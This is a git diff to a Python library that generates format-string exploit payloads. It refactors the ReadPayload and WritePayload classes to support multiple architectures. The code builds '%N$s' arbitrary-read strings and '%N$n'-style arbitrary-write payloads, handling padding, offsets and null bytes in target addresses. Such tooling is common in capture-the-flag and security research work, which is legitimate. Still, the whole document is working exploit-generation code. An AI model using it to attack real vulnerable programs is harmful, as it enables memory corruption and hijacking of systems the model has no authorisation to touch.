@@ -1,23 +1,16 @@
 #!/usr/bin/env python3
+import math
 import operator
 import struct
-import math
+from formatstring.architectures import struct_fmt, local_arch
 
 
-def unpack_bytes(endianness, value):
+def unpack_bytes(arch, value):
     if isinstance(value, list):
         value = bytes(value)
 
     assert isinstance(value, bytes)
-
-    if len(value) == 1:
-        return value[0]
-    elif len(value) == 2:
-        return struct.unpack(endianness + 'H', value)[0]
-    elif len(value) == 4:
-        return struct.unpack(endianness + 'I', value)[0]
-    elif len(value) == 8:
-        return struct.unpack(endianness + 'Q', value)[0]
+    return struct.unpack(arch.endian_fmt + struct_fmt(len(value), False), value)[0]
 
 
 class NullByteException(Exception):
@@ -25,28 +18,24 @@ class NullByteException(Exception):
 
 
 class PayloadSettings:
-    def __init__(self, offset, padding=0, address_fmt='@I', null_bytes=True):
+    def __init__(self, offset, padding=0, arch=None, null_bytes=True, padding_byte=None):
         '''
         Args:
             offset (int): The offset of your buffer
             padding (int): The needed padding
-            address_fmt (string): The format for an address (see struct.pack)
+            arch (Architecture): The architecture
             null_bytes (bool): Null bytes are allowed
+            padding byte (bytes): The byte used for padding
         '''
-        assert 0 <= padding <= 3
         self.offset = offset
         self.padding = padding
-        self.address_fmt = address_fmt
+        self.arch = arch or local_arch()
         self.null_bytes = null_bytes
 
-    def padding_byte(self):
-        return b'\x00' if self.null_bytes else b'\xff'
-
-    def endianness(self):
-        if self.address_fmt[0] in ('@', '<', '>'):
-            return self.address_fmt[0]
+        if padding_byte:
+            self.padding_byte = padding_byte
         else:
-            return '@'
+            self.padding_byte = b'\x00' if self.null_bytes else b'\xff'
 
     def check_null_bytes(self, payload):
         if not self.null_bytes and b'\x00' in payload:
@@ -74,13 +63,12 @@ class ReadPayload:
             The payload to read at `address`
         '''
         offset = settings.offset
-        offset += 3 # %x$s + padding
-        offset += math.ceil(start_len / 4) # start_len
+        offset += math.ceil((max(0, start_len - settings.padding) + len('%99999$s')) / settings.arch.bytes)
 
         payload = b'%' + str(offset).encode('ascii') + b'$s'
-        assert settings.padding + 4 * (offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
-        payload += settings.padding_byte() * (settings.padding + 4 * (offset - settings.offset) - start_len - len(payload))
-        payload += struct.pack(settings.address_fmt, self.address)
+        assert settings.padding + settings.arch.bytes * (offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
+        payload += settings.padding_byte * (settings.padding + settings.arch.bytes * (offset - settings.offset) - start_len - len(payload))
+        payload += struct.pack(settings.arch.address_fmt, self.address)
         settings.check_null_bytes(payload)
         return payload
 
@@ -105,24 +93,22 @@ class WritePayload:
         Generate a list of write operations to perform
         '''
         writes = []
-        endianness = settings.endianness()
         addresses = sorted(self.memory.keys())
 
         i = 0
         while i < len(addresses):
             addr = addresses[i]
 
-            if (not settings.null_bytes
-                    and b'\x00' in struct.pack(settings.address_fmt, addr)):
+            if not settings.null_bytes and b'\x00' in struct.pack(settings.arch.address_fmt, addr):
                 # null byte in address, try to write at addr - 1
 
-                if b'\x00' in struct.pack(settings.address_fmt, addr - 1):
+                if b'\x00' in struct.pack(settings.arch.address_fmt, addr - 1):
                     raise NullByteException('generated payload contains a null byte')
 
-                byte0 = self.memory[addr - 1] if addr - 1 in self.memory else 0
+                byte0 = self.memory.get(addr - 1, 0)
 
                 if all(addr + j in self.memory for j in range(3)):
-                    value = unpack_bytes(endianness, [byte0, self.memory[addr], self.memory[addr + 1], self.memory[addr + 2]])
+                    value = unpack_bytes(settings.arch, [byte0, self.memory[addr], self.memory[addr + 1], self.memory[addr + 2]])
                     if value <= 0xffff: # write 4 bytes
                         writes.append((addr - 1, value, 4))
                         i += 3
@@ -130,12 +116,12 @@ class WritePayload:
 
                 # write 2 bytes
                 writes.append((addr - 1,
-                               unpack_bytes(endianness, [byte0, self.memory[addr]]),
+                               unpack_bytes(settings.arch, [byte0, self.memory[addr]]),
                                2))
                 i += 1
             else:
                 if all(addr + j in self.memory for j in range(4)):
-                    value = unpack_bytes(endianness, [self.memory[addr], self.memory[addr + 1], self.memory[addr + 2], self.memory[addr + 3]])
+                    value = unpack_bytes(settings.arch, [self.memory[addr], self.memory[addr + 1], self.memory[addr + 2], self.memory[addr + 3]])
                     if value <= 0xffff: # write 4 bytes
                         writes.append((addr, value, 4))
                         i += 4
@@ -143,12 +129,12 @@ class WritePayload:
 
                 if addr + 1 in self.memory: # write 2 bytes
                     writes.append((addr,
-                                   unpack_bytes(endianness, [self.memory[addr], self.memory[addr + 1]]),
+                                   unpack_bytes(settings.arch, [self.memory[addr], self.memory[addr + 1]]),
                                    2))
                     i += 2
                 else: # write 1 byte
                     writes.append((addr,
-                                   unpack_bytes(endianness, [self.memory[addr]]),
+                                   unpack_bytes(settings.arch, [self.memory[addr]]),
                                    1))
                     i += 1
 
@@ -168,8 +154,6 @@ class WritePayload:
 
         # compute the offset
         offset = settings.offset
-        offset += 1 # padding
-        offset += math.ceil(start_len / 4) # start_len
 
         estimated_payload_len = 0
         current_value = start_len
@@ -184,7 +168,7 @@ class WritePayload:
 
             estimated_payload_len += len('%%%d$%s' % (99999, write_specifier[size]))
 
-        offset += math.ceil(estimated_payload_len / 4)
+        offset += math.ceil((max(0, start_len - settings.padding) + estimated_payload_len) / settings.arch.bytes)
 
         # generate the payload
         payload = b''
@@ -201,11 +185,11 @@ class WritePayload:
                 payload += b'A' * print_len
 
             payload += b'%' + str(offset).encode('ascii') + b'$' + write_specifier[size]
-            addresses += struct.pack(settings.address_fmt, addr)
+            addresses += struct.pack(settings.arch.address_fmt, addr)
             offset += 1
 
-        assert settings.padding + 4 * (start_offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
-        payload += settings.padding_byte() * (settings.padding + 4 * (start_offset - settings.offset) - start_len - len(payload))
+        assert settings.padding + settings.arch.bytes * (start_offset - settings.offset) - start_len - len(payload) >= 0, 'bad padding'
+        payload += settings.padding_byte * (settings.padding + settings.arch.bytes * (start_offset - settings.offset) - start_len - len(payload))
         payload += addresses
         settings.check_null_bytes(payload)
         return payload
